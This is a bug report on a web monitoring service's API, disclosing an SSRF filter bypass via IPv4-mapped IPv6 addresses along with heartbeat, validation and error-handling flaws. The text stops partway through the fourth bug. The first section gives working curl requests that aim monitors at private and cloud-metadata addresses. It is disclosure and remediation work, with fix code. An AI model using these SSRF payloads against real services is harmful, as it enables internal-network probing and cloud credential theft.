# WhatPing — Combined Bug Report

**Reported by:** Vikki Hirapure  
**Date:** 19 August 2026  
**Target:** `https://www.whatping.com/`

## Executive Summary

This report combines five confirmed issues identified during manual API and dashboard testing of WhatPing on 19 August 2026.

| Bug | Title | Severity | Status |
|---|---|---|---|
| BUG #1 | IPv4-mapped IPv6 SSRF Bypass | 🔴 Critical | Confirmed |
| BUG #2 | Heartbeat Ping Endpoint Broken on Dashboard Host | 🔴 Critical | Confirmed |
| BUG #3 | IP Literals Accepted for SSL (Certificate) Monitor | 🟠 High | Confirmed |
| BUG #4 | IP Literals Accepted for DNS Monitor | 🟠 High | Confirmed |
| BUG #5 | Invalid Pagination Cursor → 500 Internal Error | 🟡 Medium | Confirmed |

## Overall Findings

- **2 Critical** issues
- **2 High** severity issues
- **1 Medium** severity issue
- The findings cover SSRF protection, heartbeat monitoring availability, intelligence-monitor input validation, and API error handling.
- BUG #3 and BUG #4 share the same underlying validation gap and can be addressed through a shared intelligence-monitor host validator.
- BUG #5 is an unhandled client-input error and should return a structured `422` rather than `500`.

---

## BUG #1 — IPv4-mapped IPv6 SSRF Bypass

## Summary

An HTTP monitor with a URL containing an IPv4-mapped IPv6 address (e.g. `http://[::ffff:10.0.0.1]/`) is accepted and created, bypassing WhatPing's private-network target filter. This allows a user to point monitors at internal/private network addresses — including the **cloud metadata endpoint** (`169.254.169.254`) — which is a textbook Server-Side Request Forgery (SSRF) vulnerability.

Plain IPv4 private addresses ARE correctly blocked, but wrapping the same address in an IPv6 `::ffff:` prefix bypasses the filter entirely.

---

## Documentation vs. Actual Behavior

### Documentation says it should be blocked

From `https://www.whatping.com/docs/security`:

> "Private-network targets are refused by default, covering: Loopback (127.0.0.0/8, ::1), RFC1918 (10/8, 172.16/12, 192.168/16), Link-local incl. cloud metadata (169.254.0.0/16, fe80::/10), CGNAT (100.64.0.0/10)..."
>
> "IPv4-mapped IPv6 addresses are unwrapped and re-checked, so `::ffff:10.0.0.1` cannot bypass the IPv4 rules."

### Actual behavior

The IPv4-mapped IPv6 unwrapping described in the docs is **not implemented**. Addresses like `::ffff:10.0.0.1`, `::ffff:127.0.0.1`, and `::ffff:169.254.169.254` pass validation and monitors are created successfully.

---

## Reproduction Steps

### Step 1 — Verify plain private IP is blocked (control test)

**Command:**
```powershell
$body = '{"type":"http","name":"test-private-plain","url":"http://10.0.0.1/"}'
$body | Out-File -Encoding ascii -NoNewline "$env:TEMP\wp_a.json"
curl.exe -s -X POST https://api.whatping.com/v1/monitors -H "Authorization: Bearer [REDACTED]" -H "content-type: application/json" --data-binary "@$env:TEMP\wp_a.json" -w "`nHTTP_STATUS:%{http_code}`n"
```

**Response (healthy — filter works):**
```json
{
  "error": {
    "code": "invalid_request",
    "message": "Private-network targets are not permitted on this deployment"
  }
}
HTTP_STATUS:422
```

This confirms the private-network filter works correctly for plain IPv4.

---

### Step 2 — Wrap the same IP in IPv6 (the bypass)

**Command:**
```powershell
$body = '{"type":"http","name":"test-v6wrap","url":"http://[::ffff:10.0.0.1]/"}'
$body | Out-File -Encoding ascii -NoNewline "$env:TEMP\wp_b.json"
curl.exe -s -X POST https://api.whatping.com/v1/monitors -H "Authorization: Bearer [REDACTED]" -H "content-type: application/json" --data-binary "@$env:TEMP\wp_b.json" -w "`nHTTP_STATUS:%{http_code}`n"
```

**Response (BUG — bypass confirmed):**
```json
{
  "accepted_status": "200",
  "cert_warn_days": null,
  "confirm_externally": true,
  "consecutive_failures": 0,
  "created_at": 1787135701709,
  "down_threshold": 2,
  "enabled": true,
  "id": "m97cvm6b5qr491e6ccbt32yqk98crdrn",
  "interval_sec": 60,
  "name": "test-v6wrap",
  "state": "pending",
  "timeout_ms": 10000,
  "type": "http",
  "url": "http://[::ffff:a00:1]/"
}
HTTP_STATUS:201
```

The monitor was created with `201 Created` despite pointing at RFC1918 address `10.0.0.1` (stored as `::ffff:a00:1`).

---

### Step 3 — Cloud metadata endpoint (the critical variant)

**Command:**
```powershell
$body = '{"type":"http","name":"test-metadata","url":"http://[::ffff:169.254.169.254]/latest/meta-data/"}'
$body | Out-File -Encoding ascii -NoNewline "$env:TEMP\wp_c.json"
curl.exe -s -X POST https://api.whatping.com/v1/monitors -H "Authorization: Bearer [REDACTED]" -H "content-type: application/json" --data-binary "@$env:TEMP\wp_c.json" -w "`nHTTP_STATUS:%{http_code}`n"
```

**Response (BUG — critical bypass confirmed):**
```json
{
  "accepted_status": "200",
  "consecutive_failures": 0,
  "created_at": 1787135712644,
  "down_threshold": 2,
  "enabled": true,
  "id": "m979v3vh5tez50n9tee28dprys8cra3y",
  "interval_sec": 60,
  "name": "test-metadata",
  "state": "pending",
  "timeout_ms": 10000,
  "type": "http",
  "url": "http://[::ffff:a9fe:a9fe]/latest/meta-data/"
}
HTTP_STATUS:201
```

The monitor pointing at the **cloud metadata endpoint** was created with `201 Created`. The stored URL is `http://[::ffff:a9fe:a9fe]/latest/meta-data/` — which maps to `169.254.169.254`, the AWS/GCP/Azure metadata service.

---

## Evidence of Active Exploitation

After creation, the prober actively attempted to connect to the private addresses. Querying the monitor state confirmed real check attempts:

```json
{
  "consecutive_failures": 3,
  "last_check_at": 1787135835928,
  "last_error": "connection failed",
  "last_latency_ms": 1019,
  "state": "down",
  "url": "http://[::ffff:a00:1]/"
}
```

This proves the monitor was not just stored — the prober actually executed HTTP requests against the private-network target. On a cloud-hosted deployment, the metadata-endpoint variant would have returned IAM credentials, security tokens, and other secrets in the check results or error messages.

---

## Test Cases Summary

| # | URL Submitted | Maps To | Expected | Actual | Verdict |
|---|---------------|---------|----------|--------|---------|
| 1 | `http://10.0.0.1/` | RFC1918 `10.0.0.1` | `422` blocked | `422` blocked | ✅ Filter works |
| 2 | `http://[::ffff:10.0.0.1]/` | RFC1918 `10.0.0.1` | `422` blocked | `201` created | 🔴 Bypass |
| 3 | `http://[::ffff:127.0.0.1]/` | Loopback `127.0.0.1` | `422` blocked | `201` created | 🔴 Bypass |
| 4 | `http://[::ffff:169.254.169.254]/latest/meta-data/` | Cloud metadata | `422` blocked | `201` created | 🔴 Critical bypass |

---

## Impact

### Security Impact: CRITICAL

| Risk | Description |
|------|-------------|
| **Cloud credential theft** | If WhatPing is hosted on AWS/GCP/Azure, a monitor pointing at `http://[::ffff:169.254.169.254]/latest/meta-data/` lets an attacker read the cloud instance's IAM credentials, security tokens, and other secrets. These credentials could be used to access S3 buckets, databases, or other cloud resources. |
| **Internal network scanning** | An attacker can create monitors pointing at any RFC1918 address (`10.x.x.x`, `172.16-31.x.x`, `192.168.x.x`) to map and probe WhatPing's internal network. |
| **Loopback access** | A monitor pointing at `127.0.0.1` can access services running on the WhatPing server itself — internal APIs, admin panels, databases bound to localhost. |
| **Information leakage** | Error messages and check results from internal services may reveal internal network topology, service versions, and configuration details. |

### Business Impact

| Risk | Description |
|------|-------------|
| **Trust erosion** | The security documentation explicitly claims this bypass is prevented. Users relying on WhatPing's documented security guarantees are unknowingly exposed. |
| **Compliance** | Any compliance framework requiring SSRF protection (PCI-DSS, SOC 2, etc.) would flag this as a critical finding. |

---

## Root Cause

The target-validation code checks the parsed IP address against the private-network ranges, but it does not unwrap IPv4-mapped IPv6 addresses before the check. When an IPv6 address like `::ffff:10.0.0.1` is parsed, it is treated as an IPv6 address and the IPv4 private-range check is never applied to the embedded IPv4 address.

The IPv4 range check itself works correctly (plain `10.0.0.1` is blocked) — the missing piece is the normalization step that extracts the IPv4 from the IPv6 wrapper.

---

## How to Fix

### Option 1 — Normalize IPv4-mapped IPv6 before the range check (recommended)

In the target-validation code, before running the SSRF check, unwrap any IPv4-mapped IPv6 address to its IPv4 form and run the existing IPv4 range check:

```rust
fn is_private(ip: IpAddr) -> bool {
    match ip {
        IpAddr::V4(v4) => is_private_v4(v4),
        IpAddr::V6(v6) => {
            // Unwrap IPv4-mapped IPv6 (::ffff:a.b.c.d)
            if let Some(v4) = v6.to_ipv4_mapped() {
                return is_private_v4(v4);
            }
            // Also handle IPv4-translated IPv6 (::a.b.c.d) if applicable
            is_private_v6(v6)
        }
    }
}
```

The Rust standard library's `Ipv6Addr::to_ipv4_mapped()` handles both the hex form (`::ffff:a00:1`) and the decimal form (`::ffff:10.0.0.1`) — both normalize to `10.0.0.1`.

### Option 2 — Reject all IPv6 literals in HTTP monitor URLs

If IPv6 support is not needed for HTTP monitors, simply reject any URL whose host is an IPv6 literal:

```rust
if url.host().map(|h| h.is_ipv6()).unwrap_or(false) {
    return Err(Error::invalid("IPv6 literals are not permitted in monitor URLs"));
}
```

This is more restrictive but eliminates the entire class of IPv6-based bypasses.

### Option 3 — Validate at the URL-parsing layer

After parsing the URL, extract the host and resolve it to an IP address, then check the resolved IP (not the literal) against the private ranges. This catches DNS-based bypasses as well (e.g. a domain that resolves to `169.254.169.254`).

---

## Verification After Fix

After deploying the fix, re-run the reproduction steps. All three test cases should return `422`:

| URL | Expected after fix |
|-----|-------------------|
| `http://10.0.0.1/` | `422` (already works) |
| `http://[::ffff:10.0.0.1]/` | `422` (was `201`) |
| `http://[::ffff:127.0.0.1]/` | `422` (was `201`) |
| `http://[::ffff:169.254.169.254]/latest/meta-data/` | `422` (was `201`) |

---

## Disclosure Timeline

| Date | Action |
|------|--------|
| 19 Aug 2026 | Bug discovered and confirmed by Vikki Hirapure during manual API testing |
| 19 Aug 2026 | Bug report exported to `whatping-bug-1-ssrf-bypass.md` |

---

## Test Environment

| Item | Value |
|------|-------|
| API base URL | `https://api.whatping.com/v1` |
| Workspace | `Personal` (`n17d91811mzbd9vta919a3fs5s8cstt1`) |
| Key scope | `write` |
| Test monitors created | 2 (`test-v6wrap`, `test-metadata`) |
| Test monitors deleted | 2 (cleanup confirmed, workspace is empty) |
| Existing email channel | `mahabocw.in` (untouched) |

---

## References

- WhatPing Security Model: `https://www.whatping.com/docs/security`
- WhatPing API Reference: `https://www.whatping.com/docs/api`
- WhatPing HTTP Monitor Docs: `https://www.whatping.com/docs/monitors/http`
- OWASP SSRF: `https://owasp.org/www-community/attacks/Server_Side_Request_Forgery`

---

*End of report — prepared by Vikki Hirapure, 19 August 2026.*

---

## BUG #2 — Heartbeat Ping Endpoint Broken on Dashboard Host

## Summary

The heartbeat ping endpoint at `https://monitor.whatping.com/monitor/ping/<token>` returns a `307 Temporary Redirect` to `/login` for both valid and invalid tokens — instead of the documented `200 {"ok":true}` (valid) / `404 {"ok":false}` (invalid) responses. The dashboard host's Next.js authentication middleware intercepts the `/monitor/ping/*` path and redirects all unauthenticated requests to the login page, preventing the ping handler from ever executing.

This means heartbeat monitors configured with the dashboard-host ping URL **cannot function** — cron jobs, CI pipelines, and systemd timers that ping the dashboard host will never successfully report a heartbeat, causing every heartbeat monitor to eventually alert as `down`.

The same endpoint works correctly on the API host (`api.whatping.com`), confirming the token logic is sound — the bug is purely a routing/middleware misconfiguration on the dashboard host.

---

## Documentation vs. Actual Behavior

### Documentation says no authentication is required

From `https://www.whatping.com/docs/heartbeat-api`:

> "Both methods behave identically. No headers, no body, no authentication beyond the token in the path."
>
> | Status | Body | Meaning |
> | ------ | ---- | ------- |
> | 200 | `{"ok":true}` | Ping recorded |
> | 404 | `{"ok":false}` | Unknown token |
>
> "The response is deliberately uniform and detail-free. A 404 does not say whether the token is malformed, expired or simply wrong, so the endpoint cannot be used to enumerate or probe monitors."

### Actual behavior on the dashboard host

Every request to `https://monitor.whatping.com/monitor/ping/<token>` — regardless of token validity — receives:

```
HTTP/1.1 307 Temporary Redirect
location: /login
```

The documented `200`/`404` responses never occur.

---

## Reproduction Steps

### Step 1 — Create a heartbeat monitor to obtain a valid token

**Command:**
```powershell
$body = '{"type":"push","name":"test-heartbeat","push_expected_interval_sec":3600,"push_grace_sec":300}'
$body | Out-File -Encoding ascii -NoNewline "$env:TEMP\wp_hb.json"
curl.exe -s -X POST https://api.whatping.com/v1/monitors -H "Authorization: Bearer [REDACTED]" -H "content-type: application/json" --data-binary "@$env:TEMP\wp_hb.json" -w "`nHTTP_STATUS:%{http_code}`n"
```

**Response (201 Created — monitor created with push token):**
```json
{
  "id": "m9727t9yv2jbt2sft46h3dwfjn8cs4zc",
  "name": "test-heartbeat",
  "type": "push",
  "push_expected_interval_sec": 3600,
  "push_grace_sec": 300,
  "push_token_prefix": "pt_602fd",
  "push_token": "pt_602fd6cb37602800640708dae795329038c702fde67bda6c",
  "state": "pending"
}
HTTP_STATUS:201
```

A valid push token was issued: `pt_602fd6cb37602800640708dae795329038c702fde67bda6c`

---

### Step 2 — Ping the dashboard host with the valid token (the bug)

**Command:**
```powershell
curl.exe -s "https://monitor.whatping.com/monitor/ping/pt_602fd6cb37602800640708dae795329038c702fde67bda6c" -w "`nHTTP_STATUS:%{http_code}`n" -D - -o NUL
```

**Response (BUG — redirect to login instead of 200):**
```
HTTP/1.1 307 Temporary Redirect
Date: Wed, 19 Aug 2026 10:42:58 GMT
location: /login
x-content-type-options: nosniff
x-frame-options: DENY
cf-cache-status: DYNAMIC
Server: cloudflare

HTTP_STATUS:307
```

A valid token should return `200 {"ok":true}`. Instead, the dashboard host redirects to the login page.

---

### Step 3 — Confirm the same token works on the API host

**Command:**
```powershell
curl.exe -s "https://api.whatping.com/monitor/ping/pt_602fd6cb37602800640708dae795329038c702fde67bda6c" -w "`nHTTP_STATUS:%{http_code}`n"
```

**Response (healthy — API host works):**
```
{"ok":true}
HTTP_STATUS:200
```

This proves the token is valid and the ping endpoint logic works — the dashboard host is what's broken.

---

### Step 4 — Test an invalid token on the dashboard host

**Command:**
```powershell
curl.exe -s "https://monitor.whatping.com/monitor/ping/pt_invalid_token_xxxxxxxxxxxxxxxx" -w "`nHTTP_STATUS:%{http_code}`n" -D - -o NUL
```

**Response (BUG — redirect to login instead of 404):**
```
HTTP/1.1 307 Temporary Redirect
Date: Wed, 19 Aug 2026 10:43:45 GMT
location: /login

HTTP_STATUS:307
```

An invalid token should return `404 {"ok":false}`. The dashboard host redirects to login instead.

---

### Step 5 — Confirm invalid token returns correct 404 on API host

**Command:**
```powershell
curl.exe -s "https://api.whatping.com/monitor/ping/pt_invalid_token_xxxxxxxxxxxxxxxx" -w "`nHTTP_STATUS:%{http_code}`n"
```

**Response (healthy — API host returns correct 404):**
```
{"ok":false}
HTTP_STATUS:404
```

---

### Step 6 — Cleanup (delete the test monitor)

**Command:**
```powershell
curl.exe -s -X DELETE "https://api.whatping.com/v1/monitors/m9727t9yv2jbt2sft46h3dwfjn8cs4zc" -H "Authorization: Bearer [REDACTED]" -w "`nHTTP_STATUS:%{http_code}`n"
```

**Response:**
```
HTTP_STATUS:204
```

Monitor deleted. Workspace confirmed clean (0 monitors).

---

## Test Results Summary

| # | Host | Token | Expected | Actual | Verdict |
|---|------|-------|----------|--------|---------|
| 1 | `monitor.whatping.com` | Valid (`pt_602fd...`) | `200 {"ok":true}` | `307 → /login` | 🔴 BUG |
| 2 | `monitor.whatping.com` | Invalid (`pt_invalid_token_xxx`) | `404 {"ok":false}` | `307 → /login` | 🔴 BUG |
| 3 | `api.whatping.com` | Valid (`pt_602fd...`) | `200 {"ok":true}` | `200 {"ok":true}` | ✅ Healthy |
| 4 | `api.whatping.com` | Invalid (`pt_invalid_token_xxx`) | `404 {"ok":false}` | `404 {"ok":false}` | ✅ Healthy |

The dashboard host fails for both valid and invalid tokens. The API host handles both correctly.

---

## Impact

### Functional Impact: CRITICAL

| Risk | Description |
|------|-------------|
| **Heartbeat monitoring broken** | Any user whose ping URL uses `monitor.whatping.com` (the dashboard host) cannot use heartbeat monitors. Every ping attempt is redirected to login and never recorded. |
| **False alerts** | Heartbeat monitors drift to `down` state because pings are never received. Users get alerted that their cron jobs / backups / CI pipelines have failed — when they actually ran fine. |
| **Silent failures** | A cron job using `curl -fsS` against the dashboard host will fail silently. The `-f` flag makes curl treat the `307` as an error (non-2xx after redirect resolution depends on client behavior), but the job's failure to ping looks like the job failed, not the monitoring system. |
| **Design contradiction** | The endpoint is documented as requiring no authentication. The redirect-to-login behavior makes the entire heartbeat monitor type unusable via the dashboard host. |

### User Experience Impact

The docs state the ping URL is "shown once, when you create the heartbeat monitor" in the dashboard UI. If the dashboard displays a URL using `monitor.whatping.com`, users will copy it, wire it into their cron jobs, and it will never work — with no clear error message explaining why. The ping "succeeds" (307 followed by 200 on the login page HTML), so even logging won't reveal the problem.

---

## Root Cause

The dashboard host (`monitor.whatping.com`) is a Next.js application. Its middleware (auth gate) intercepts all unmatched paths and redirects unauthenticated requests to `/login`. The `/monitor/ping/*` route is not exempted from this middleware, so it never reaches a handler that would return the documented `200`/`404` responses.

Evidence from the response headers:
- `location: /login` — the redirect target
- `x-middleware-rewrite: /en/login` (observed when following the redirect) — confirms Next.js middleware is performing the rewrite

The API host (`api.whatping.com`) does not have this middleware, so it handles the ping endpoint correctly.

---

## How to Fix

### Option A — Exempt the ping path from the auth middleware (recommended)

In the Next.js middleware configuration, exclude `/monitor/ping/*` from the authentication check so the ping handler can run without a session:

```ts
// middleware.ts
export const config = {
  matcher: [
    // Match everything EXCEPT the ping endpoint and static assets
    '/((?!monitor/ping|_next/static|_next/image|favicon.ico).*)',
  ],
};
```

### Option B — Proxy the ping path to the API host

Add a rewrite in `next.config.js` so `/monitor/ping/*` on the dashboard host is proxied to the API host where the endpoint works:

```js
// next.config.js
async rewrites() {
  return [
    {
      source: '/monitor/ping/:token',
      destination: 'https://api.whatping.com/monitor/ping/:token',
    },
  ];
}
```

### Additional recommendation — Verify the displayed ping URL

Regardless of which fix is applied, verify that the ping URL shown in the dashboard UI (when creating a heartbeat monitor) points to a host where the endpoint actually works. If the UI displays `https://monitor.whatping.com/monitor/ping/<token>`, it must either:
- Be fixed to work on that host (Option A), or
- Be changed to display `https://api.whatping.com/monitor/ping/<token>` (or whichever host correctly handles the endpoint).

---

## Verification After Fix

After deploying the fix, re-run the reproduction steps. Both tests against the dashboard host should return the documented responses:

| Test | Expected after fix |
|------|-------------------|
| Valid token on `monitor.whatping.com` | `200 {"ok":true}` |
| Invalid token on `monitor.whatping.com` | `404 {"ok":false}` |

Additionally, verify that the ping is actually recorded by checking the monitor's `last_ping_at` field after a successful ping:

```powershell
curl.exe -s "https://api.whatping.com/v1/monitors/MONITOR_ID" -H "Authorization: Bearer [REDACTED]"
```

The `last_ping_at` field should be populated with a timestamp after a successful ping.

---

## Disclosure Timeline

| Date | Action |
|------|--------|
| 19 Aug 2026 | Bug discovered and confirmed by Vikki Hirapure during manual API + dashboard host testing |
| 19 Aug 2026 | Bug report exported to `whatping-bug-2-heartbeat-ping-broken.md` |

---

## Test Environment

| Item | Value |
|------|-------|
| API base URL | `https://api.whatping.com/v1` |
| Dashboard host | `https://monitor.whatping.com` |
| Workspace | `Personal` (`n17d91811mzbd9vta919a3fs5s8cstt1`) |
| Key scope | `write` |
| Test monitor created | `test-heartbeat` (`m9727t9yv2jbt2sft46h3dwfjn8cs4zc`) |
| Test monitor deleted | Yes (cleanup confirmed, workspace is empty) |
| Valid token used | `pt_602fd6cb37602800640708dae795329038c702fde67bda6c` (rotated/deleted with monitor) |
| Existing email channel | `mahabocw.in` (untouched) |

---

## References

- WhatPing Heartbeat Ping Endpoint Docs: `https://www.whatping.com/docs/heartbeat-api`
- WhatPing Heartbeat Monitor Docs: `https://www.whatping.com/docs/monitors/heartbeat`
- WhatPing API Reference: `https://www.whatping.com/docs/api`
- Next.js Middleware docs: `https://nextjs.org/docs/app/building-your-application/routing/middleware`

---

*End of report — prepared by Vikki Hirapure, 19 August 2026.*

---

## BUG #3 — IP Literals Accepted for SSL (Certificate) Monitor

## Summary

A certificate (SSL) monitor accepts an IP literal (e.g. `1.1.1.1`) as the `host` field, despite the documentation explicitly stating that SSL monitor targets must be bare hostnames with no IP literals. This violates WhatPing's documented security model for intelligence monitors (certificate, domain, DNS, email-auth), which states that these monitor types must target bare domain names only.

The check will then attempt a TLS handshake against the IP address, which is semantically wrong — the security model promises intelligence monitors only target domains, and the documentation is therefore inaccurate.

---

## Documentation vs. Actual Behavior

### Documentation says IP literals are forbidden

From `https://www.whatping.com/docs/monitors/ssl`:

> "The domain is a bare hostname: `api.example.com`. No scheme, no port, no path, and **no IP literals** — a scheme or path is stripped where it is unambiguous and rejected where it is not."

From `https://www.whatping.com/docs/security`:

> "Stricter rules for intelligence monitors. Certificate, domain, DNS and email-auth targets must be bare domain names: no scheme, no port, no path, no IP literals. Those targets are passed to a third-party API rather than fetched directly, so the surface is narrowed further."

### Actual behavior

An SSL monitor created with `host: "1.1.1.1"` (a public IP literal) is accepted with `201 Created`. No validation error is returned.

---

## Reproduction Steps

### Step 1 — Create an SSL monitor with an IP literal

**Command:**
```powershell
$body = '{"type":"ssl","name":"test-ssl-ip","host":"1.1.1.1"}'
$body | Out-File -Encoding ascii -NoNewline "$env:TEMP\wp_ssl.json"
curl.exe -s -X POST https://api.whatping.com/v1/monitors -H "Authorization: Bearer [REDACTED]" -H "content-type: application/json" --data-binary "@$env:TEMP\wp_ssl.json" -w "`nHTTP_STATUS:%{http_code}`n"
```

**Response (BUG — monitor created with IP literal):**
```json
{
  "cert_warn_days": 30,
  "created_at": 1787136586685,
  "down_threshold": 2,
  "enabled": true,
  "host": "1.1.1.1",
  "id": "m97cb5ge1a14hsgcha54j5vwj98csfev",
  "interval_sec": 86400,
  "name": "test-ssl-ip",
  "state": "pending",
  "timeout_ms": 10000,
  "type": "ssl"
}
HTTP_STATUS:201
```

The monitor was created with `201 Created` and `host: "1.1.1.1"` — an IP literal. The expected behavior is a `422` validation error rejecting the IP literal.

---

### Step 2 — Cleanup (delete the test monitor)

**Command:**
```powershell
curl.exe -s -X DELETE "https://api.whatping.com/v1/monitors/m97cb5ge1a14hsgcha54j5vwj98csfev" -H "Authorization: Bearer [REDACTED]" -w "`nHTTP_STATUS:%{http_code}`n"
```

**Response:**
```
HTTP_STATUS:204
```

Monitor deleted. Workspace confirmed clean (0 monitors).

---

## Test Results Summary

| # | Host value | Expected | Actual | Verdict |
|---|------------|----------|--------|---------|
| 1 | `1.1.1.1` (public IP) | `422` rejected | `201` created | 🔴 BUG |

The SSL monitor's host validation does not reject IP literals, contradicting the documented security model.

---

## Impact

### Security Impact: HIGH

| Risk | Description |
|------|-------------|
| **Security model violation** | The documented security model promises that intelligence monitors (cert, domain, DNS, email-auth) only target bare domain names. Accepting IP literals breaks this guarantee. |
| **Surface expansion** | Intelligence monitors are documented as having a "narrowed surface" because their targets are passed to a third-party API rather than fetched directly. Accepting IP literals expands the input surface beyond what was documented and reviewed. |
| **Documentation inaccuracy** | Users auditing WhatPing's security guarantees based on the documentation will believe IP literals are rejected when they are not. This matters for security reviews and compliance assessments. |

### Functional Impact

| Risk | Description |
|------|-------------|
| **Semantically wrong monitor** | A certificate check against an IP literal may succeed (the IP has a TLS cert), but the resulting monitor is semantically incorrect — certificates are issued for domain names, not IPs (except in rare cases). The monitor may report misleading results. |
| **Inconsistency with other intelligence monitors** | The domain monitor correctly rejects ports/schemes (verified: `example.com:8080` → `422`), but the SSL monitor does not reject IP literals. The validation rules are inconsistent across intelligence monitor types. |

---

## Root Cause

The SSL monitor's host validation rejects schemes, ports, and paths, but does not include a check for IP literals. The validation logic for intelligence monitors is missing the IP-literal rejection rule that the documentation describes.

The domain monitor correctly rejects `host: "example.com:8080"` (verified during testing — returns `422` "Domain must not include a port or scheme"), so the validation framework exists, but the IP-literal check is not applied to the SSL monitor type.

---

## How to Fix

### Recommended — Add an IP-literal check to the intelligence-monitor host validator

Apply the IP-literal rejection to the shared validation path used by all intelligence monitors (SSL, domain, DNS, email-auth):

```rust
fn validate_intelligence_host(host: &str) -> Result<(), Error> {
    // Reject IP literals (both IPv4 and IPv6)
    if host.parse::<IpAddr>().is_ok() {
        return Err(Error::invalid_request(
            "host must be a bare domain name, not an IP literal"
        ));
    }
    // ... existing scheme/port/path checks
    Ok(())
}
```

This should be applied to all four intelligence monitor types (`ssl`, `domain`, `dns`, `email-auth`) in a single shared validator, fixing BUG #3 (SSL) and BUG #4 (DNS) together.

### Test cases to add

After the fix, these inputs should be rejected with `422`:

| Monitor type | Host value | Expected |
|--------------|-----------|----------|
| ssl | `1.1.1.1` | `422` |
| ssl | `::1` | `422` |
| ssl | `[::ffff:1.1.1.1]` | `422` |
| dns | `1.1.1.1` | `422` |
| domain | `1.1.1.1` | `422` |
| email-auth | `1.1.1.1` | `422` |

---

## Verification After Fix

After deploying the fix, re-run the reproduction command:

```powershell
$body = '{"type":"ssl","name":"test-ssl-ip","host":"1.1.1.1"}'
$body | Out-File -Encoding ascii -NoNewline "$env:TEMP\wp_ssl.json"
curl.exe -s -X POST https://api.whatping.com/v1/monitors -H "Authorization: Bearer [REDACTED]" -H "content-type: application/json" --data-binary "@$env:TEMP\wp_ssl.json" -w "`nHTTP_STATUS:%{http_code}`n"
```

**Expected after fix:**
```json
{
  "error": {
    "code": "invalid_request",
    "message": "host must be a bare domain name, not an IP literal"
  }
}
HTTP_STATUS:422
```

Also verify that valid domain names still work:

```powershell
$body = '{"type":"ssl","name":"test-ssl-valid","host":"example.com"}'
$body | Out-File -Encoding ascii -NoNewline "$env:TEMP\wp_ssl_valid.json"
curl.exe -s -X POST https://api.whatping.com/v1/monitors -H "Authorization: Bearer [REDACTED]" -H "content-type: application/json" --data-binary "@$env:TEMP\wp_ssl_valid.json" -w "`nHTTP_STATUS:%{http_code}`n"
```

**Expected:** `201 Created` (valid domain should still be accepted).

---

## Disclosure Timeline

| Date | Action |
|------|--------|
| 19 Aug 2026 | Bug discovered and confirmed by Vikki Hirapure during manual API testing |
| 19 Aug 2026 | Bug report exported to `whatping-bug-3-ssl-ip-literal.md` |

---

## Test Environment

| Item | Value |
|------|-------|
| API base URL | `https://api.whatping.com/v1` |
| Workspace | `Personal` (`n17d91811mzbd9vta919a3fs5s8cstt1`) |
| Key scope | `write` |
| Test monitor created | `test-ssl-ip` (`m97cb5ge1a14hsgcha54j5vwj98csfev`) |
| Test monitor deleted | Yes (cleanup confirmed, workspace is empty) |
| Existing email channel | `mahabocw.in` (untouched) |

---

## References

- WhatPing SSL Monitor Docs: `https://www.whatping.com/docs/monitors/ssl`
- WhatPing Security Model: `https://www.whatping.com/docs/security`
- WhatPing API Reference: `https://www.whatping.com/docs/api`

---

*End of report — prepared by Vikki Hirapure, 19 August 2026.*

---

## BUG #4 — IP Literals Accepted for DNS Monitor

## Summary

A DNS monitor accepts an IP literal (e.g. `1.1.1.1`) as the `host` field, despite the documentation explicitly stating that intelligence monitor targets (certificate, domain, DNS, email-auth) must be bare domain names with no IP literals. This violates WhatPing's documented security model.

A DNS A-record lookup against an IP address is semantically meaningless — IP addresses do not have A records — so the monitor will perpetually fail or return an error. This is both a user-facing footgun and a security-model inconsistency.

---

## Documentation vs. Actual Behavior

### Documentation says IP literals are forbidden

From `https://www.whatping.com/docs/security`:

> "Stricter rules for intelligence monitors. Certificate, domain, DNS and email-auth targets must be bare domain names: no scheme, no port, no path, no IP literals. Those targets are passed to a third-party API rather than fetched directly, so the surface is narrowed further."

From `https://www.whatping.com/docs/monitors/dns`:

> | Field | Range | Default |
> | ----- | ----- | ------- |
> | Domain | bare hostname | — |

### Actual behavior

A DNS monitor created with `host: "1.1.1.1"` (a public IP literal) and `dns_record_type: "A"` is accepted with `201 Created`. No validation error is returned.

---

## Reproduction Steps

### Step 1 — Create a DNS monitor with an IP literal

**Command:**
```powershell
$body = '{"type":"dns","name":"test-dns-ip","host":"1.1.1.1","dns_record_type":"A"}'
$body | Out-File -Encoding ascii -NoNewline "$env:TEMP\wp_dns.json"
curl.exe -s -X POST https://api.whatping.com/v1/monitors -H "Authorization: Bearer [REDACTED]" -H "content-type: application/json" --data-binary "@$env:TEMP\wp_dns.json" -w "`nHTTP_STATUS:%{http_code}`n"
```

**Response (BUG — monitor created with IP literal):**
```json
{
  "created_at": 1787136819326,
  "dns_record_type": "A",
  "down_threshold": 2,
  "enabled": true,
  "host": "1.1.1.1",
  "id": "m97bnpshaqaa7mnnsqf46tph598cry6m",
  "interval_sec": 86400,
  "name": "test-dns-ip",
  "state": "pending",
  "timeout_ms": 10000,
  "type": "dns"
}
HTTP_STATUS:201
```

The monitor was created with `201 Created` and `host: "1.1.1.1"` — an IP literal. The expected behavior is a `422` validation error rejecting the IP literal.

---

### Step 2 — Cleanup (delete the test monitor)

**Command:**
```powershell
curl.exe -s -X DELETE "https://api.whatping.com/v1/monitors/m97bnpshaqaa7mnnsqf46tph598cry6m" -H "Authorization: Bearer [REDACTED]" -w "`nHTTP_STATUS:%{http_code}`n"
```

**Response:**
```
HTTP_STATUS:204
```

Monitor deleted. Workspace confirmed clean (0 monitors).

---

## Test Results Summary

| # | Host value | Record type | Expected | Actual | Verdict |
|---|------------|-------------|----------|--------|---------|
| 1 | `1.1.1.1` (public IP) | `A` | `422` rejected | `201` created | 🔴 BUG |

The DNS monitor's host validation does not reject IP literals, contradicting the documented security model.

---

## Impact

### Security Impact: HIGH

| Risk | Description |
|------|-------------|
| **Security model violation** | The documented security model promises that intelligence monitors (cert, domain, DNS, email-auth) only target bare domain names. Accepting IP literals breaks this guarantee. |
| **Surface expansion** | Intelligence monitors are documented as having a "narrowed surface" because their targets are passed to a third-party API rather than fetched directly. Accepting IP literals expands the input surface beyond what was documented and reviewed. |
| **Documentation inaccuracy** | Users auditing WhatPing's security guarantees based on the documentation will believe IP literals are rejected when they are not. This matters for security reviews and compliance assessments. |

### Functional Impact

| Risk | Description |
|------|-------------|
| **Semantically meaningless monitor** | A DNS A-record lookup against an IP address (`1.1.1.1`) is meaningless — IP addresses do not have A records. The monitor will perpetually fail or return an error, generating false alerts and wasting a monitor slot (limit: 20 per workspace). |
